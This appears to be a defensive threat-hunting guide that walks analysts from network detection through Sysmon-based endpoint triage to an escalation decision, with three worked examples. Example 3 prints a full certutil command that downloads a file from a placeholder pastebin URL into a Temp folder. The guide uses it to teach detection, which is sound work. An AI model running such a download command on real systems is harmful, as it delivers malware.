# Investigation Workflow: From Detection to Decision

## Introduction

Every security investigation begins with a question: Is this activity malicious or legitimate? This workflow provides a structured, repeatable approach to investigating security alerts, moving you from initial network detection through endpoint analysis to a confident decision.

### The Four-Phase Structure

**Phase 1: Discovery (Network Analysis)** 

- Network monitoring detects suspicious connections
- Correlates network activity to specific processes
- Provides the "breadth" component

**Phase 2: Initial Endpoint Triage (Passive Analysis)** 

- Examines endpoint telemetry through logs
- Immediate hash lookup using Sysmon data
- Quick assessment of the five core indicators
- Resolves 60-70% of alerts at this stage

**Phase 3: Deep Dive (Comprehensive Passive Analysis)** 

- Full evaluation of the five indicators
- Historical analysis and pattern detection
- Threat intelligence research
- Handles complex cases and sophisticated attacks

**Phase 4: Decision & Action** 

- Synthesizes evidence into confidence assessment
- Makes malicious/benign determination
- Takes appropriate action (escalate, monitor, clear)
- Documents findings

### Key Principles

**Passive-only for threat hunters**: You operate exclusively through log analysis. When passive analysis is insufficient, escalate to IR/malware specialists. Exception: if you're also trained in malware analysis AND risk justifies it.

**Network breadth + Endpoint depth**: Network monitoring provides broad detection; endpoint logs provide detailed context about which process created connections and why.

**80/20 efficiency**: Most alerts (80%) resolve in Phase 2 using just the five passive indicators. Complex cases get the time they need in Phase 3.

**Evidence integration**: Surface characteristics (name, location, hash) don't automatically override behavioral evidence. Suspicious network behavior can indicate process injection or abuse of legitimate binaries.

---

## Phase 1: Discovery (Network Analysis)

Your investigation begins when network monitoring identifies suspicious activity.

```
Network Monitoring Tool
         ↓
Suspicious Connection Detected
         ↓
Extract: Source/Dest IP, Domain, Protocol, Timing patterns
         ↓
Identify Associated Process (Sysmon Event ID 3)
```

Once you've identified the process responsible for the suspicious network activity, transition to Phase 2 for endpoint analysis.

---

## Phase 2: Initial Triage (Passive)

Phase 2 is rapid triage through passive log analysis.

```
Query Sysmon Event ID 1 (Process Creation)
         ↓
Extract: Name, Path, Command Line, Parent, Hash
         ↓
Immediate Hash Lookup (Sysmon hashes → VT/MalwareBazaar)
         ↓
Quick Assessment of Five Indicators
         ↓
Evaluate Network Behavior Context
         ↓
Decision: Clear, Continue to Phase 3, or Escalate
```

### Extract Process Details

Correlate Sysmon Event ID 3 (Network Connection) to Event ID 1 (Process Creation) using the GUID to get:

- **Process name**: What is it called?
- **Binary path**: Where is it located on disk?
- **Command line**: How was it launched? What parameters?
- **Parent process**: What spawned it?
- **User context**: Which account?
- **Timestamp**: When did it start?
- **Hashes**: SHA256, ImpHash

### Immediate Hash Lookup

This is completely passive - you're reading hashes that Sysmon already calculated at process creation:

1. Extract SHA256 and ImpHash from Sysmon Event ID 1
2. Query VirusTotal for SHA256
3. Check MalwareBazaar for SHA256 or ImpHash
4. Check internal threat intelligence


### Quick Assessment

Ask three questions about the five indicators:

1. **Is this a known good process?** (Recognized vendor, common application)
2. **Is the location expected?** (System32, Program Files vs. Temp folders)
3. **Is the parent process legitimate?** (Expected parent-child relationships)

### Evaluate Network Behavior Context

**Critical**: Surface legitimacy doesn't override strong behavioral evidence.

If all three assessment questions answer "YES," but network behavior is highly suspicious:

**Consider:**

- Process injection (malicious code in legitimate process)
- DLL hijacking or side-loading
- Living-off-the-land binary abuse
- Browser extensions or compromised add-ons

**Examples requiring Phase 3 investigation despite surface legitimacy:**

- Chrome.exe (legitimate location, signed, correct hash) making regular 60-second beacons to single unknown IP
- certutil.exe (legitimate Windows utility) downloading from pastebin.com spawned by Word → PowerShell chain
- Legitimate RMM tool (TeamViewer, ScreenConnect) not authorized in your environment

**Decision point:**

- Network behavior has reasonable explanation → Document and clear
- Network behavior highly suspicious and unexplained → Continue to Phase 3
- Uncertain → Continue to Phase 3

If assessment reveals concerning indicators OR network behavior cannot be explained, proceed to Phase 3.

---

## Phase 3: Deep Dive (Comprehensive Passive Analysis)

Phase 3 is thorough investigation using all passive data sources and the complete framework of the five indicators.

You might reach Phase 3 via:

1. Initial triage revealed suspicious indicators
2. Process appeared legitimate but network behavior is anomalous

```
Comprehensive Passive Analysis:
  → Historical Sysmon data patterns
  → Windows Event Logs + PowerShell ScriptBlock Logs
  → Prefetch files (if needed)
         ↓
Systematic Evaluation of Five Indicators
         ↓
Extended Threat Intelligence Research
         ↓
Decision: Confident determination or escalate to specialists
```

### Comprehensive Passive Analysis

**Historical Sysmon Data:**

- Has this process/binary appeared on other systems?
- Related events? (File creation, registry mods, additional connections, named pipe creation etc)
- Full process tree - what spawned it, what did it spawn?

**Windows Event Logs:**

- Security logs for authentication events (lateral movement?)
- Application/System logs for errors or unusual activity

**PowerShell ScriptBlock Logs:**

- If parent chain involves PowerShell, check decoded command content
- Reveals obfuscated/encoded commands

### Systematic Evaluation: Five Indicators

1. **Binary Location**: System directory, Program Files, or suspicious location?
2. **Process Name**: Matches location? Masquerading?
3. **Hash/ImpHash**: Matches known good/bad? Links to malware family?
4. **Command Line**: Execution policy bypasses? Encoded commands? Suspicious parameters?
5. **Parent Process**: Makes sense? Known suspicious pairs?

### Special Case: Investigating Legitimate Processes with Suspicious Behaviour

If you arrived here because a legitimate process exhibits suspicious network behaviour:

**Check for process injection (passive indicators):**

- Sysmon Event ID 8 (CreateRemoteThread) - cross-process thread creation
- Sysmon Event ID 10 (ProcessAccess) - memory access by other processes
- Sysmon Event ID 7 (Image Loaded) - DLLs loaded from unusual locations (Temp, AppData)

**Evaluate for LOLBin abuse:**

- Is this a Windows utility (certutil, regsvr32, mshta, bitsadmin)?
- Does command line represent normal admin use or abuse?
- Is parent process appropriate?
- Does user context make sense?

**Browser-specific scenarios:**

- Unexpected child processes (PowerShell, cmd.exe spawned by browser)
- Process tree matches expected architecture?

**Your determination**: Not "is the process malicious" but "is the legitimate process being abused or compromised?"

### Reaching a Decision Point

After comprehensive passive analysis, you should have sufficient information to either:

1. Make a confident determination → Proceed to Phase 4
2. Recognize passive analysis is insufficient → Escalate to IR/malware specialists

**When to escalate:**

- Passive data exhausted but confidence still insufficient
- Situation requires examining the binary directly or inspecting process memory
- Sophisticated techniques (injection, rootkits) requiring advanced forensics
- Understanding specific malware family/capabilities would significantly improve response

---

## Phase 4: Decision & Action

Synthesize all evidence and make your determination.

```
Comprehensive Evidence Assessment
         ↓
High Confidence Malicious → Alert IR immediately
         ↓
Medium Confidence → Quick additional research or escalate
         ↓
Low Confidence / Likely Benign → Document and clear
```

### Confidence Assessment

**Network behavioral evidence weighs as heavily as endpoint characteristics** - sometimes more.

**High Confidence Malicious** - Multiple strong indicators OR network behavior has no legitimate explanation:

- Known malicious hash with high VT detection
- Impossible parent-child relationship (Word spawning PowerShell with encoded commands)
- Core Windows process from wrong location
- Legitimate process with clear C2 beaconing that cannot be explained
- certutil downloading from pastebin with no admin context

**Medium Confidence** - Some suspicious indicators, not overwhelming:

- Low VT detection (1-5 engines) from less reputable vendors
- Unknown vendor with valid signature
- Suspicious location but potentially legitimate software
- LOLBin use that could be admin or malicious depending on context

**Low Confidence / Likely Benign** - Most indicators suggest legitimate:

- Valid signature from known trusted vendor
- Correct location with expected parent
- Hash confirmed legitimate
- Network connection to known vendor infrastructure matching software purpose
- Network behavior has clear, reasonable explanation

### Taking Action

**High Confidence Malicious → Alert IR Immediately**

Include in ticket:

- Summary of suspicious activity
- Key indicators (hash, path, C2 destination, behavioral anomalies)
- Timeline
- Why you've determined this is malicious
- **If legitimate process with suspicious behavior**: Note this is process compromise/injection/abuse, not standalone malware; may require memory forensics and reimaging

**Medium Confidence → Additional Research or Escalate**

Either:

1. Quick research (2-5 minutes): Search company/product, verify with user, check other systems
2. Escalate to senior analyst with findings and unresolved questions

Don't sit on medium-confidence findings indefinitely.

**Low Confidence / Likely Benign → Document and Clear**

Document:

- What you investigated
- Key findings
- Why network behavior is legitimate (if initially suspicious)
- Any caveats for future reference

### Documentation Requirements

Always document:

- Alert details and triggering event
- Process and binary information
- Hash lookup results
- Key findings
- Decision and confidence level
- Actions taken
- Time spent

---

## Workflow Examples

### Example 1: Quick Resolution via Hash Lookup

**Phase 1**: Connection to uncommon domain from WS-087

**Phase 2**:

- Process: `update_manager.exe` from `C:\Users\jane.smith\AppData\Local\Temp\`
- Parent: `outlook.exe`
- Hash lookup: 52/70 AV engines detect as Emotet

**Decision**: High confidence malicious based on hash, location, and parent. Escalate immediately.

**Time**: 4 minutes

### Example 2: Legitimate Process, Suspicious Behavior

**Phase 1**: Regular 60-second beacons from WS-075 to 45.123.67.89

**Phase 2**:

- Process: `chrome.exe` from correct location, correct parent, hash matches legitimate Chrome
- BUT: Single-destination beaconing, user reports slowness
- Decision: Continue to Phase 3 - behavior inconsistent with browsing

**Phase 3**:

- Sysmon Event ID 7: Suspicious DLL loaded from `C:\Users\john.doe\AppData\Local\Temp\`
- Conclusion: Process injection into legitimate Chrome

**Phase 4**: High confidence - legitimate Chrome compromised via DLL injection. Alert IR: Memory dump required, standard AV won't detect, system may need reimaging.

**Time**: 11 minutes

### Example 3: Living-off-the-Land Binary Abuse

**Phase 1**: HTTPS download from pastebin.com by system process

**Phase 2**:

- Process: `certutil.exe` from System32, hash matches legitimate
- Parent chain: WINWORD.EXE → powershell.exe → cmd.exe → certutil.exe
- Command: `certutil.exe -urlcache -split -f https://pastebin.com/raw/abc123 C:\Users\victim\AppData\Local\Temp\update.exe`
- Decision: Continue to Phase 3 - legitimate binary, suspicious context

**Phase 3**:

- Downloaded file hash: 38/70 VT detections
- Full process chain confirms document-based attack

**Phase 4**: High confidence malicious - LOLBin abuse via macro. Escalate.

**Time**: 9 minutes

---

This workflow ensures you catch both obvious malware and sophisticated techniques that abuse or compromise legitimate processes through systematic passive analysis of the five core indicators.